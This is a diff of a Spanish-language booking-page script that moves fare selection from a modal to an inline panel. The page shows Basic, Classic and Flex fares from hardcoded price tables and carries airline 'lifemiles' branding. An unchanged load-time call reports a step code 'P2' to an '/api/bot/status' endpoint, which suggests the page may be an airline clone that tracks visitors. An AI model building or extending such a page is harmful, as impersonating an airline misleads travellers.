@@ -1,41 +1,53 @@
 /**
- * SET DOM
- * 
+ * flight-detail.js — con TARIFAS INLINE + fallback modal
+ * - INLINE_FARES = true -> se despliega debajo del vuelo
+ * - No cambia tu back ni tus IDs/funciones existentes
  */
+
+/* ===== CONFIG ===== */
+const INLINE_FARES = true;          // cambia a false si quieres volver al modal
+let _lastClickedCard = null;        // recordaremos la card clickeada
+
+// capturamos qué .card-departure se clickeó (para insertar el panel debajo)
+document.addEventListener('click', (e)=>{
+  const c = e.target.closest('.card-departure');
+  if (c) _lastClickedCard = c;
+});
+
+/* ===== SET DOM ===== */
 const modal = document.querySelector('#modal-select-ticket');
 
 const loader = document.querySelector('.loader');
 setTimeout(() =>{
-    try{
-        document.querySelector('body').classList.remove('sb-hidden');
-        loader.classList.remove('show');
+  try{
+    document.querySelector('body').classList.remove('sb-hidden');
+    loader.classList.remove('show');
 
-        if(info.edit === 1){
-            btnSearchFlight.click();
-        }
-        console.log("Index ON")
-        fetch(`${API_URL}/api/bot/status`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': `Bearer ${API_KEY}`
-            },
-            body: JSON.stringify({message: 'P2'})
-        })
-    }catch(err){
-        console.log(err);
+    if(info.edit === 1){
+      btnSearchFlight.click();
     }
+    console.log("Index ON")
+    fetch(`${API_URL}/api/bot/status`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${API_KEY}`
+      },
+      body: JSON.stringify({message: 'P2'})
+    })
+  }catch(err){
+    console.log(err);
+  }
 }, 2500);
 
 const closeModalTicket = document.querySelector('#modal-close-ticket');
-closeModalTicket.addEventListener('click', () =>{
-    try{
-        modal.classList.remove('show');
-    }catch(e){
-        console.log(e);
-    }
+closeModalTicket && closeModalTicket.addEventListener('click', () =>{
+  try{
+    modal.classList.remove('show');
+  }catch(e){
+    console.log(e);
+  }
 });
-
 
 /* --- HEADER --- */
 document.querySelector('#origin-code').textContent = info.flightInfo.origin.code;
@@ -45,222 +57,232 @@ document.querySelector('#flight-label-1').textContent = `Selecciona tu vuelo de 
 document.querySelector('#flight-label-2').textContent = `${info.flightInfo.origin.city} a ${info.flightInfo.destination.city}`;
 document.querySelector('#flight-label-3').textContent = `${formatDateType1(info.flightInfo.flightDates[0])}`;
 
-
 /* --- FLIGHT CARDS --- */
 if(info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador'){
-    // NAC
-    document.querySelector('#flight-price-0').textContent  = formatPrice(pricesNAC.flight_1.xs);
-    document.querySelector('#flight-price-1').textContent  = formatPrice(pricesNAC.flight_1.xs);
-    document.querySelector('#flight-price-2').textContent  = formatPrice(pricesNAC.flight_2.xs);
-    document.querySelector('#flight-price-3').textContent  = formatPrice(pricesNAC.flight_3.xs);
-    // añadidos 4..10 (si existen en functions.js)
-    document.querySelector('#flight-price-4') && (document.querySelector('#flight-price-4').textContent  = formatPrice(pricesNAC.flight_4.xs));
-    document.querySelector('#flight-price-5') && (document.querySelector('#flight-price-5').textContent  = formatPrice(pricesNAC.flight_5.xs));
-    document.querySelector('#flight-price-6') && (document.querySelector('#flight-price-6').textContent  = formatPrice(pricesNAC.flight_6.xs));
-    document.querySelector('#flight-price-7') && (document.querySelector('#flight-price-7').textContent  = formatPrice(pricesNAC.flight_7.xs));
-    document.querySelector('#flight-price-8') && (document.querySelector('#flight-price-8').textContent  = formatPrice(pricesNAC.flight_8.xs));
-    document.querySelector('#flight-price-9') && (document.querySelector('#flight-price-9').textContent  = formatPrice(pricesNAC.flight_9.xs));
-    document.querySelector('#flight-price-10') && (document.querySelector('#flight-price-10').textContent = formatPrice(pricesNAC.flight_10.xs));
+  // NAC
+  document.querySelector('#flight-price-0').textContent  = formatPrice(pricesNAC.flight_1.xs);
+  document.querySelector('#flight-price-1').textContent  = formatPrice(pricesNAC.flight_1.xs);
+  document.querySelector('#flight-price-2').textContent  = formatPrice(pricesNAC.flight_2.xs);
+  document.querySelector('#flight-price-3').textContent  = formatPrice(pricesNAC.flight_3.xs);
+  // añadidos 4..10 (si existen en functions.js)
+  document.querySelector('#flight-price-4') && (document.querySelector('#flight-price-4').textContent  = formatPrice(pricesNAC.flight_4.xs));
+  document.querySelector('#flight-price-5') && (document.querySelector('#flight-price-5').textContent  = formatPrice(pricesNAC.flight_5.xs));
+  document.querySelector('#flight-price-6') && (document.querySelector('#flight-price-6').textContent  = formatPrice(pricesNAC.flight_6.xs));
+  document.querySelector('#flight-price-7') && (document.querySelector('#flight-price-7').textContent  = formatPrice(pricesNAC.flight_7.xs));
+  document.querySelector('#flight-price-8') && (document.querySelector('#flight-price-8').textContent  = formatPrice(pricesNAC.flight_8.xs));
+  document.querySelector('#flight-price-9') && (document.querySelector('#flight-price-9').textContent  = formatPrice(pricesNAC.flight_9.xs));
+  document.querySelector('#flight-price-10') && (document.querySelector('#flight-price-10').textContent = formatPrice(pricesNAC.flight_10.xs));
 }else{
-    // INT
-    document.querySelector('#flight-price-0').textContent  = formatPrice(pricesINT.flight_1.xs);
-    document.querySelector('#flight-price-1').textContent  = formatPrice(pricesINT.flight_1.xs);
-    document.querySelector('#flight-price-2').textContent  = formatPrice(pricesINT.flight_2.xs);
-    document.querySelector('#flight-price-3').textContent  = formatPrice(pricesINT.flight_3.xs);
-    // añadidos 4..10 (si existen en functions.js)
-    document.querySelector('#flight-price-4') && (document.querySelector('#flight-price-4').textContent  = formatPrice(pricesINT.flight_4.xs));
-    document.querySelector('#flight-price-5') && (document.querySelector('#flight-price-5').textContent  = formatPrice(pricesINT.flight_5.xs));
-    document.querySelector('#flight-price-6') && (document.querySelector('#flight-price-6').textContent  = formatPrice(pricesINT.flight_6.xs));
-    document.querySelector('#flight-price-7') && (document.querySelector('#flight-price-7').textContent  = formatPrice(pricesINT.flight_7.xs));
-    document.querySelector('#flight-price-8') && (document.querySelector('#flight-price-8').textContent  = formatPrice(pricesINT.flight_8.xs));
-    document.querySelector('#flight-price-9') && (document.querySelector('#flight-price-9').textContent  = formatPrice(pricesINT.flight_9.xs));
-    document.querySelector('#flight-price-10') && (document.querySelector('#flight-price-10').textContent = formatPrice(pricesINT.flight_10.xs));
+  // INT
+  document.querySelector('#flight-price-0').textContent  = formatPrice(pricesINT.flight_1.xs);
+  document.querySelector('#flight-price-1').textContent  = formatPrice(pricesINT.flight_1.xs);
+  document.querySelector('#flight-price-2').textContent  = formatPrice(pricesINT.flight_2.xs);
+  document.querySelector('#flight-price-3').textContent  = formatPrice(pricesINT.flight_3.xs);
+  // añadidos 4..10 (si existen en functions.js)
+  document.querySelector('#flight-price-4') && (document.querySelector('#flight-price-4').textContent  = formatPrice(pricesINT.flight_4.xs));
+  document.querySelector('#flight-price-5') && (document.querySelector('#flight-price-5').textContent  = formatPrice(pricesINT.flight_5.xs));
+  document.querySelector('#flight-price-6') && (document.querySelector('#flight-price-6').textContent  = formatPrice(pricesINT.flight_6.xs));
+  document.querySelector('#flight-price-7') && (document.querySelector('#flight-price-7').textContent  = formatPrice(pricesINT.flight_7.xs));
+  document.querySelector('#flight-price-8') && (document.querySelector('#flight-price-8').textContent  = formatPrice(pricesINT.flight_8.xs));
+  document.querySelector('#flight-price-9') && (document.querySelector('#flight-price-9').textContent  = formatPrice(pricesINT.flight_9.xs));
+  document.querySelector('#flight-price-10') && (document.querySelector('#flight-price-10').textContent = formatPrice(pricesINT.flight_10.xs));
 }
-
-
 
 /**
  * BUTTONS
- * 
  */
 const btnEditFlight = document.querySelector('#btn-edit-flight');
-btnEditFlight.addEventListener('click', ()=>{
-    info.edit = 1;
-    updateLS();
-    window.location.href = 'index.html';
+btnEditFlight && btnEditFlight.addEventListener('click', ()=>{
+  info.edit = 1;
+  updateLS();
+  window.location.href = 'index.html';
 });
-
-
 
 /**
  * FUNCTIONS
- * 
  */
 function updateLS(){
-    LS.setItem('info', JSON.stringify(info));
+  LS.setItem('info', JSON.stringify(info));
 }
 
 function formatDateType1(date){
-    let format = new Date(parseInt(date.split('-')[0]), parseInt(date.split('-')[1]) - 1, parseInt(date.split('-')[2]) - 1);
-    return dayDic[format.getDay()] + ', ' + monthDic[format.getMonth()] + ' ' + date.split('-')[2];
+  let format = new Date(parseInt(date.split('-')[0]), parseInt(date.split('-')[1]) - 1, parseInt(date.split('-')[2]) - 1);
+  return dayDic[format.getDay()] + ', ' + monthDic[format.getMonth()] + ' ' + date.split('-')[2];
 }
 
 function formatPrice(number){
-    return number.toLocaleString('en', {
-        maximumFractionDigits: 2
-    });
+  return number.toLocaleString('en', { maximumFractionDigits: 2 });
 }
 
+/* ================================================================
+   MODO INLINE (despliega debajo del vuelo) o MODAL (fallback)
+   ================================================================ */
 function loadFlight(flight_sched){
-    //Open modal
-    try{
-        modal.classList.add('show');
-    }catch(err){
-        console.log(err);
-    }
+  // Guardar selección
+  info.flightInfo.ticket_sched = flight_sched;
 
-    info.flightInfo.ticket_sched = flight_sched;
-    updateLS();
+  // Setear NAT/INT como hacías antes
+  const isNAC = (info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador');
+  info.flightInfo.ticket_nat = isNAC ? 'NAC' : 'INT';
+  updateLS();
 
-    const xsPrice = document.querySelector('#xs');
-    const sPrice = document.querySelector('#s');
-    const mPrice = document.querySelector('#m');
+  if (INLINE_FARES) {
+    // esperamos un tick para que el listener global registre _lastClickedCard
+    setTimeout(()=>{ renderInlineFares(flight_sched); }, 0);
+    return; // no abrimos modal
+  }
 
-    if(info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador'){
-        // Set type
-        info.flightInfo.ticket_nat = 'NAC';
-        updateLS();
+  // ----- Fallback: MODO MODAL (tu comportamiento original) -----
+  try{ modal.classList.add('show'); }catch(err){ console.log(err); }
 
-        console.log(info.flightInfo);
+  const xsPrice = document.querySelector('#xs');
+  const sPrice  = document.querySelector('#s');
+  const mPrice  = document.querySelector('#m');
 
-        if(flight_sched === 'flight_1'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_1.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_1.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_1.m)
-        }else if(flight_sched === 'flight_2'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_2.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_2.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_2.m)
-        }else if(flight_sched === 'flight_3'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_3.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_3.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_3.m)
-        }else if(flight_sched === 'flight_4'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_4.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_4.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_4.m)
-        }else if(flight_sched === 'flight_5'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_5.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_5.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_5.m)
-        }else if(flight_sched === 'flight_6'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_6.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_6.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_6.m)
-        }else if(flight_sched === 'flight_7'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_7.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_7.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_7.m)
-        }else if(flight_sched === 'flight_8'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_8.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_8.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_8.m)
-        }else if(flight_sched === 'flight_9'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_9.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_9.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_9.m)
-        }else if(flight_sched === 'flight_10'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_10.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_10.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_10.m)
-        }
-    }else{
-        // Set type
-        info.flightInfo.ticket_nat = 'INT';
-        updateLS();
-
-        if(flight_sched === 'flight_1'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_1.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_1.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_1.m)
-        }else if(flight_sched === 'flight_2'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_2.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_2.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_2.m)
-        }else if(flight_sched === 'flight_3'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_3.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_3.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_3.m)
-        }else if(flight_sched === 'flight_4'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_4.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_4.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_4.m)
-        }else if(flight_sched === 'flight_5'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_5.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_5.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_5.m)
-        }else if(flight_sched === 'flight_6'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_6.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_6.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_6.m)
-        }else if(flight_sched === 'flight_7'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_7.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_7.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_7.m)
-        }else if(flight_sched === 'flight_8'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_8.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_8.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_8.m)
-        }else if(flight_sched === 'flight_9'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_9.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_9.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_9.m)
-        }else if(flight_sched === 'flight_10'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_10.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_10.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_10.m)
-        }
-    }
+  const P = isNAC ? pricesNAC : pricesINT;
+  const F = P[flight_sched]; // {xs, s, m}
+  if (xsPrice && sPrice && mPrice && F){
+    xsPrice.textContent = formatPrice(F.xs);
+    sPrice.textContent  = formatPrice(F.s);
+    mPrice.textContent  = formatPrice(F.m);
+  }
 }
 
-function nextStep(type){
-    info.flightInfo.ticket_type = type;
-    updateLS();
-    if(info.flightInfo.type === 1){
-        window.location.href = 'flight-detail-back.html';
-    }else{
-        window.location.href = 'step-two.html';
-    }
+// obtiene la card clickeada o la que coincide con el onclick del flight_sched
+function getCardForFlight(flight_sched){
+  if (_lastClickedCard && _lastClickedCard.matches('.card-departure')) return _lastClickedCard;
+  const all = Array.from(document.querySelectorAll('.card-departure[onclick]'));
+  return all.find(el => (el.getAttribute('onclick') || '').includes(flight_sched)) || all[0];
+}
 
-    /* ==== UI SUAVE PARA EL MODAL DE TARIFAS (drop-in, no rompe nada) ==== */
+// Render del panel inline (bonito) justo después de la card seleccionada
+function renderInlineFares(flight_sched){
+  const card = getCardForFlight(flight_sched);
+  if (!card){ console.warn('No se encontró card'); return; }
+
+  // cerrar paneles previos
+  document.querySelectorAll('.av-inline-fares').forEach(p => p.remove());
+
+  const isNAC = (info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador');
+  const P = isNAC ? pricesNAC : pricesINT;
+  const F = P[flight_sched]; // {xs, s, m}
+  if (!F){ console.warn('No hay precios para', flight_sched); return; }
+
+  const html = `
+    <div class="av-inline-fares" data-flight="${flight_sched}">
+      <h3 class="av-choose-title">Elige cómo quieres volar</h3>
+      <div class="av-fares-grid">
+        <div class="card-container xs">
+          <div class="card-ticket">
+            <h2 class="card-ticket-type">Basic</h2>
+            <p class="card-ticket-label">Vuela ligero</p>
+            <div class="card-ticket-items">
+              <div class="ct-item"><img src="./assets/svg/personalItemLowest-XS.svg" width="18"><p>1 artículo personal (bolso)</p></div>
+              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
+            </div>
+          </div>
+          <div class="card-ticket-header" data-next="xs">
+            <h6 class="fs-3">$${formatPrice(F.xs)}</h6>
+            <p class="fs-5">Precio por pasajero</p>
+          </div>
+        </div>
+
+        <div class="card-container s">
+          <div class="card-ticket">
+            <h2 class="card-ticket-type">Classic</h2>
+            <p class="card-ticket-label">Más completo</p>
+            <div class="card-ticket-items">
+              <div class="ct-item"><img src="./assets/svg/S_1.svg" width="18"><p>1 artículo personal (bolso)</p></div>
+              <div class="ct-item"><img src="./assets/svg/S_2.svg" width="18"><p>1 equipaje de mano (10kg)</p></div>
+              <div class="ct-item"><img src="./assets/svg/S_3.svg" width="18"><p>1 equipaje de bodega (23kg)</p></div>
+              <div class="ct-item"><img src="./assets/svg/S_4.svg" width="18"><p>Check-in en aeropuerto</p></div>
+              <div class="ct-item"><img src="./assets/svg/S_5.svg" width="18"><p>Asiento Economy</p></div>
+              <div class="ct-item"><img src="./assets/svg/S_6.svg" width="18"><p>Acumula lifemiles</p></div>
+              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
+            </div>
+          </div>
+          <div class="card-ticket-header" data-next="s">
+            <h6 class="fs-3">$${formatPrice(F.s)}</h6>
+            <p class="fs-5">Precio por pasajero</p>
+          </div>
+        </div>
+
+        <div class="card-container m">
+          <div class="card-ticket">
+            <h2 class="card-ticket-type">Flex</h2>
+            <p class="card-ticket-label">Más posibilidades</p>
+            <div class="card-ticket-items">
+              <div class="ct-item"><img src="./assets/svg/M_1.svg" width="18"><p>1 artículo personal (bolso)</p></div>
+              <div class="ct-item"><img src="./assets/svg/M_2.svg" width="18"><p>1 equipaje de mano (10kg)</p></div>
+              <div class="ct-item"><img src="./assets/svg/M_3.svg" width="18"><p>1 equipaje de bodega (23kg)</p></div>
+              <div class="ct-item"><img src="./assets/svg/M_4.svg" width="18"><p>Check-in en aeropuerto</p></div>
+              <div class="ct-item"><img src="./assets/svg/M_5.svg" width="18"><p>Asiento Economy</p></div>
+              <div class="ct-item"><img src="./assets/svg/M_6.svg" width="18"><p>Acumula lifemiles</p></div>
+              <div class="ct-item"><img src="./assets/svg/M_7.svg" width="18"><p>Reembolso</p></div>
+              <div class="ct-item"><img src="./assets/svg/M_8.svg" width="18"><p>Cambios de vuelo</p></div>
+              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
+            </div>
+          </div>
+          <div class="card-ticket-header" data-next="m">
+            <h6 class="fs-3">$${formatPrice(F.m)}</h6>
+            <p class="fs-5">Precio por pasajero</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  `;
+
+  // insertar justo después de la card seleccionada
+  card.insertAdjacentHTML('afterend', html);
+
+  // acciones: seleccionar tarifa -> tu flujo original
+  const panel = card.nextElementSibling;
+  if (!panel) return;
+
+  panel.addEventListener('click', (e)=>{
+    const btn = e.target.closest('.card-ticket-header');
+    if (!btn) return;
+    nextStep(btn.dataset.next); // usa tu función existente
+  });
+
+  // enfocar con scroll suave
+  panel.scrollIntoView({ behavior:'smooth', block:'start' });
+}
+
+/* ===== Paso siguiente (igual que tenías) ===== */
+function nextStep(type){
+  info.flightInfo.ticket_type = type;
+  updateLS();
+  if(info.flightInfo.type === 1){
+    window.location.href = 'flight-detail-back.html';
+  }else{
+    window.location.href = 'step-two.html';
+  }
+}
+
+/* ===== Suavizado del MODAL como respaldo (por si INLINE_FARES=false) ===== */
 (function () {
-  const modal   = document.getElementById('modal-select-ticket');
-  const closeBtn = document.getElementById('modal-close-ticket');
-  if (!modal) return;
+  const modalEl = document.getElementById('modal-select-ticket');
+  const closeBtnEl = document.getElementById('modal-close-ticket');
+  if (!modalEl) return;
 
   function onOpen() {
-    // Asegura accesibilidad + bloqueo de scroll
-    modal.setAttribute('aria-hidden', 'false');
-    modal.removeAttribute('hidden');
+    modalEl.setAttribute('aria-hidden', 'false');
+    modalEl.removeAttribute('hidden');
     document.body.style.overflow = 'hidden';
   }
   function onClose() {
-    modal.setAttribute('aria-hidden', 'true');
+    modalEl.setAttribute('aria-hidden', 'true');
     document.body.style.overflow = '';
   }
 
-  // Observa cuando tu código agrega/remueve .show
   const mo = new MutationObserver(() => {
-    const isOpen = modal.classList.contains('show') && getComputedStyle(modal).display !== 'none';
+    const isOpen = modalEl.classList.contains('show') && getComputedStyle(modalEl).display !== 'none';
     if (isOpen) onOpen(); else onClose();
   });
-  mo.observe(modal, { attributes: true, attributeFilter: ['class', 'hidden', 'style'] });
+  mo.observe(modalEl, { attributes: true, attributeFilter: ['class', 'hidden', 'style'] });
 
-  // Cerrar con botón, clic fuera y ESC (sin tocar tu handler existente)
-  if (closeBtn) closeBtn.addEventListener('click', () => modal.classList.remove('show'));
-  modal.addEventListener('click', (e) => { if (e.target === modal) modal.classList.remove('show'); });
-  document.addEventListener('keydown', (e) => { if (e.key === 'Escape') modal.classList.remove('show'); });
+  closeBtnEl && closeBtnEl.addEventListener('click', () => modalEl.classList.remove('show'));
+  modalEl.addEventListener('click', (e) => { if (e.target === modalEl) modalEl.classList.remove('show'); });
+  document.addEventListener('keydown', (e) => { if (e.key === 'Escape') modalEl.classList.remove('show'); });
 })();
-
-    
-}
